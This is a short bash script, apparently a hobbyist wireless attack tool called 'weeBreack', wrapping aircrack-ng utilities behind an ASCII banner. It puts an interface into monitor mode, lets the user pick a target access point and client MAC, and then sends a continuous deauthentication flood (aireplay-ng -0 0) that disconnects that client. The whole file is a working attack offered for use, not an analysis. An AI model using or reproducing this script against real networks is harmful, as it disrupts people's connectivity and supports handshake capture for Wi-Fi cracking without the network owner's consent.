#!/usr/bin/bash

###################################################
# Createby: wh04m1su
# Gmail: wh04m1su@gmail.com
# Telegram: https://t.me/wh04m1su


red="\033[1;31m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
endColour="\033[0m\e[0m"

function banner(){
	echo -e "${Fiuscha}                   ____                      _"    
	sleep 0.1
	echo -e "__      _____  ___| __ ) _ __ ___  __ _  ___| | __"
	sleep 0.1
	echo -e "\ \ /\ / / _ \/ _ \  _ \|  __/ _ \/ _  |/ __| |/ /"
	sleep 0.1
 	echo -e " \ V  V /  __/  __/ |_) | | |  __/ (_| | (__|   <"
 	sleep 0.1
  	echo -e "  \_/\_/ \___|\___|____/|_|  \___|\__ _|\___|_|\_ ${red}"
  	sleep 0.1
  	echo -e ""
  	sleep 0.1
  	echo -e "						Createby: wh04m1su"
  	sleep 0.1
  	echo -e "						gmail: wh04m1su@gmail.com${endColour}"
                                                 
}


function main(){
	banner
	airmon-ng
	echo -e "${Cafe}[*]${endColour} Type Interface for Monitor mode: "
	read interface 
	airmon-ng start $interface > /dev/null &
	echo -e "${Cafe}[*]${endColour} Seleccione BSSID del TargetAP: "
	xterm -hold -e airodump-ng $interface
	read AP 
	xterm -hold -e airodump-ng $interface --bssid $AP
	echo -e "${Cafe}[*]${endColour} Seleccione MAC para el Attacke Desauth: "
	read dmac
	xterm -hold -e aireplay-ng -0 0 -a $AP -c $dmac $interface &
	echo -e "${Fiuscha}[*]${endColour} !! Susfulled Attack !!"
}

main
